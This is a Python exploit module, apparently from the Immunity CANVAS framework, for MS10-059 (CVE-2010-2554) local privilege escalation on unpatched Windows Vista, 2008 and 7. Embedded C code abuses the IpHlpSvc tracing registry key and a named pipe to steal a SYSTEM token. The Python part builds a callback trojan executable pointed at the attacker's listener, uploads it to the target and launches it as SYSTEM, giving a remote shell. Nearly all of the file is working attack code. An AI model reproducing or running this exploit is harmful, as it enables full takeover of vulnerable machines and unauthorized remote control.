#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2010
#http://www.immunityinc.com/CANVAS/ for more information

import os
import sys
import time
import random

#covers both angles
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
import canvasengine
from MOSDEF import mosdef
import canvaserror
from libs.canvasos import canvasos

#Import LocalExploit
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit

NAME="ms10_059"
DESCRIPTION="Go SYSTEM on Win2008/Win7"

DOCUMENTATION={}
DOCUMENTATION['VENDOR'      ] = "Microsoft"
DOCUMENTATION['Date Public' ] = "08/10/2010"
DOCUMENTATION['CVE Name'    ] = "CVE-2010-2554"
DOCUMENTATION['CVE Url'     ] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2554"
DOCUMENTATION['CVSS'        ] = 6.8
DOCUMENTATION['References'  ] = 'http://www.microsoft.com/technet/security/bulletin/MS10-059.mspx'
DOCUMENTATION["Notes"       ]="""
This exploit gain SYSTEM from NETWORK_SERVICE or DefaultAppPool user by duplicating
a handle obtained from a tracing feature for services by writing on a key registry
with low access protection.

This is a port of Cesar Cerrudo's Chimichurri Token kidnapping for fitting in MOSDEF.


Should work on Windows 2008 and 7 without patch ms10_059 aka KB982799.
"""


VERSION="1.0"
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['Vista','2008','7']
PROPERTY['MSADV']='MS10-059'
PROPERTY['MS PATCHES']=["KB982799"]


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.result=""
        self.name=NAME
        return

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def makecode(self, mosdeffile):
        code = """
//remote
#import "remote", "Advapi32.dll|RegSetValueExA" as "RegSetValueExA"
#import "remote", "Advapi32.dll|RegOpenKeyExA" as "RegOpenKeyExA"
#import "remote", "Advapi32.dll|RegCloseKey" as "RegCloseKey"
#import "remote", "Kernel32.dll|CreateNamedPipeA" as "CreateNamedPipeA"
#import "remote", "Kernel32.dll|SetEvent" as "SetEvent"
#import "remote", "Kernel32.dll|ConnectNamedPipe" as "ConnectNamedPipe"
#import "remote", "Kernel32.dll|CloseHandle" as "CloseHandle"
#import "remote", "Advapi32.dll|OpenThreadToken" as "OpenThreadToken"
#import "remote", "Kernel32.dll|CreateEventA" as "CreateEventA"
#import "remote", "Kernel32.dll|CreateThread" as "CreateThread"
#import "remote", "Kernel32.dll|TerminateThread" as "TerminateThread"
#import "remote", "Kernel32.dll|WaitForSingleObject" as "WaitForSingleObject"
#import "remote", "Advapi32.dll|CreateProcessAsUserA" as "CreateProcessAsUserA"
#import "remote", "Kernel32.dll|GetEnvironmentVariableA" as "GetEnvironmentVariableA"
#import "remote", "Advapi32.dll|DuplicateTokenEx" as "DuplicateTokenEx"
#import "remote", "Advapi32.dll|ImpersonateNamedPipeClient" as "ImpersonateNamedPipeClient"
#import "remote", "Kernel32.dll|GetCurrentThread" as "GetCurrentThread"
#import "remote", "Kernel32.dll|Sleep" as "Sleep"
#import "remote", "Kernel32.dll|GetLastError" as "GetLastError"

//local
#import "local", "strlen" as "strlen"
#import "local", "memset" as "memset"
#import "local", "sendunistring2self" as "sendunistring2self"
#import "local", "senddata2self" as "senddata2self"
#import "local", "sendint" as "sendint"
#import "local", "debug" as "debug"
#import "local", "memcpy" as "memcpy"
#import "local", "restore_base" as "restore_base"

//constants
#define NULL 0
#define REG_EXPAND_SZ 2
#define ERROR_SUCCESS 0

#define HKEY_LOCAL_MACHINE 0x80000002
#define KEY_SET_VALUE 2
#define KEY_WOW64_64KEY 0x100
#define REG_DWORD 4
#define PIPE_ACCESS_DUPLEX 3
#define PIPE_TYPE_MESSAGE 4
#define PIPE_WAIT 0

#define TOKEN_ALL_ACCESS 0x1ff
#define TOKEN_ALL_ACCESS_P 0xff

#define INFINITE 0xFFFFFFFF

#define MAXIMUM_ALLOWED 0x2000000
#define SecurityImpersonation 2
#define TokenPrimary 1

struct STARTUPINFO {
  int cb;
  char * lpReserved;
  char * lpDesktop;
  char * lpTitle;
  int dwX;
  int dwY;
  int dwXSize;
  int dwYSize;
  int dwXCountChars;
  int dwYCountChars;
  int dwFillAttribute;
  int dwFlags;
  short int wShowWindow;
  short int cbReserved2;
  int * lpReserved2;
  int hStdInput;
  int hStdOutput;
  int hStdError;
};

int SpawnReverseShell(int hToken)
{
  int hToken2;
  int hTokenTmp;
  char pInfo[32];
  int dwRes;
  struct STARTUPINFO sInfo;
  int gle;

  memset(&sInfo, 0, 68);
  memset(pInfo, 0, 16);

  sInfo.cb=68;
  //So we don't have to wait the process
  sInfo.lpDesktop= "WinSta0\\Default";

  hTokenTmp=hToken;

  DuplicateTokenEx(hTokenTmp,MAXIMUM_ALLOWED,NULL,SecurityImpersonation, TokenPrimary,&hToken2) ;

  char *lpComspec;
  lpComspec = "RUNTHIS";

  dwRes=CreateProcessAsUserA(hToken2,  NULL ,lpComspec, NULL, NULL, FALSE,  NULL, NULL, NULL, &sInfo, pInfo);
  gle = GetLastError();

  //send value back to canvas
  sendint(dwRes);
  if(dwRes == 0){
    sendint(gle);
  }
  CloseHandle(hTokenTmp);
  CloseHandle(hToken2);

  return dwRes;
}

int SetRegistryValues(int on)
{
  int hKey;
  char *a;
  //TODO: should we fix this in mosdef?
  a = "\\\\\\localhost\\pipe\\x";
  char *b;
  b="%windir%\\tracing";
  int  y;
  int dwsize;
  char *x;
  x=a;
  y=1;

  dwsize=strlen(a)+1;
  int result;
  result = 0;

  if(on==0){
    x=b;
    y=0;
    dwsize=strlen(b)+1;
  }

  if( RegOpenKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Tracing\\IpHlpSvc",NULL,KEY_SET_VALUE|KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS )
  {
    if (RegSetValueExA(hKey,"FileDirectory",NULL,REG_EXPAND_SZ,x,dwsize)== ERROR_SUCCESS )
    {
      if (RegSetValueExA(hKey,"EnableFileTracing",NULL,REG_DWORD,&y,4)== ERROR_SUCCESS )
      {
        result=1;
      }
    }
    RegCloseKey(hKey);
  }
  return result;
}

int ThreadProc(int *lpParameter){

  char *szPipe;
  int hPipe;
  int hToken;
  int ct;

  //the createthread dirty our base so we restore it :)
  restore_base();

  //TODO: mosdef slash problem
  szPipe= "\\\\\\.\\pipe\\x\\IpHlpSvc.log";
  hPipe = 0;
  hToken=0;

  hPipe = CreateNamedPipeA (szPipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE|PIPE_WAIT, 2, 0, 0, 0, NULL);
  if (hPipe==0) {
    SetEvent(*lpParameter);
    return 0;
  }

  ConnectNamedPipe (hPipe, NULL);

  if (ImpersonateNamedPipeClient (hPipe)== 0) {
    CloseHandle(hPipe);
    SetEvent(*lpParameter);
    return 0;
  }

  ct = GetCurrentThread();
  if (OpenThreadToken(ct, TOKEN_ALL_ACCESS, TRUE, &hToken )==0) {
    SetEvent(*lpParameter);
    return 0;
  }
  CloseHandle(hPipe);

  //Got SYSTEM token..
  SpawnReverseShell(hToken);

  SetEvent(*lpParameter);
  return 1;
}

void main(){
  int lpThreadId;
  int hEvent;
  int ret;

  SetRegistryValues(0);
  Sleep(100);

  hEvent = CreateEventA(NULL,0,0,NULL);

  CreateThread(NULL,NULL,ThreadProc,&hEvent,NULL,&lpThreadId);

  //Changing registry values...
  if (SetRegistryValues(1)==0) {
    //Couldn't set registry values
    sendint(0);
    sendint(0xfffffff);
    return 0;
  }

  //Timeout (10s) and kill the thread
  ret = WaitForSingleObject(hEvent,10000);
  //WAIT_TIMEOUT
  if (ret == 0x102){
    TerminateThread(lpThreadId, 0);
    sendint(0);
    sendint(0xffffffe);
  }
  //Restoring default registry values..
  SetRegistryValues(0);
}
        """
        code = code.replace("RUNTHIS",mosdeffile)
        return code

    def run(self):
        self.setInfo("%s"%(NAME))
        node = self.argsDict["passednodes"][0]
        self.node=node
        ret = 0
        #If we are patched we dont want to run
        lib = {}
        lib['c:\\windows\\system32\\rtutils.dll'] = '6.1.7600.16617'
        if not self.check_if_vulnerable(lib):
            ret = 0

        if "win32api" in node.capabilities:
            shell=node.shell

            if not self.callback:
                #usually the engine takes care of this
                self.log("Need a callback for this exploit!")
                ret = 0

            ret,nodeos=node.shell.GetVersionEx()
            minor=nodeos['Minor Version']
            major=nodeos['Major Version']
            if major != 6:
                self.log('Windows %d.%d not supported, expecting 6.1 Win2k8/Win7'%(major,minor))
                ret = 0
            self.log('Attacking Windows %d.%d'%(major,minor))

            #Upload a new mosdef file.
            t_os        = canvasos('WINDOWS')
            t_os.arch   = 'X86'
            trojan = self.buildmosdeftrojan(self.callback.ip, self.callback.port, t_os, universal=True)

            if trojan != True:
                self.log('building mosdef trojan failed')
                ret = 0

            #use pelib to build the universal callback shellcode into a trojan .exe
            fi = 'a%d.exe' % (random.randint(0,1000))
            f = open(fi,'w')
            f.write(self.mosdeftrojan)
            f.close()

            remote_filename_exe='tempfile%d.exe'%random.randint(0,1000)
            try:
                ret=self.node.shell.upload(source=fi,destfilename=remote_filename_exe)
            except canvaserror.NodeCommandError, message:
                self.log("Could not upload files!, changing dir.")

                tempdir=node.shell.GetEnvironmentVariable("TEMP")
                self.log("Chdiring into %s on node %s"%(tempdir, node.getname()))
                chdir_ret=node.shell.chdir(tempdir)
                if chdir_ret!=-1:
                    #success!
                    self.log("Running attack in the tempdir to see if that helps")
                    ret=self.node.shell.upload(source=fi,destfilename=remote_filename_exe)
                    self.log("Attack returned: %s"%ret)
                else:
                    self.log("Could not chdir into %s - bailing out"%tempdir)
                    self.setInfo("%s: Could not find writable directory (failed)"%NAME)
                    ret = 0

            os.remove(fi)

            vars = {}
            code = self.makecode(remote_filename_exe)
            try:
              shell.clearfunctioncache()
              request=shell.compile(code,vars)
              shell.sendrequest(request)
              #return from CreateProcessAsUser
              return_value = shell.readint()
              #if it fails, should send GetLastError
              if return_value == 0:
                  err = shell.readint()
                  shell.leave()
                  if err == 0xfffffff:
                      self.log('Couldnt write in registry')
                  elif err == 0xffffffe:
                      self.log('The exploit timed out')
                  else:
                      self.log('Error from GetLastError: 0x%x' % (err))
                  #remove unused file if exploit fails
                  ret=self.node.shell.unlink(remote_filename_exe)
                  self.log('Removing remote file returned: %s' % (ret))
                  ret = 0
              else:
                  self.log('New impersonated process was created')
                  self.log("You should see another node appearing now")

              shell.leave()
              if self.ISucceeded():
                ret = 1
              else:
                ret = 0
            except Exception as e:
              self.node.shell.unlink(remote_filename_exe)
              ret = 0
        else:
            self.log("Node not supported")
            ret = 0

        if ret:
          self.setInfo("%s - done (success: %s)"%(NAME,self.result))
          return 1
        else:
          self.setInfo("%s - done (failed: %s)"%(NAME,self.result))
          return 0


if __name__=="__main__":
    print "This is an exploit that should be used only from within CANVAS"
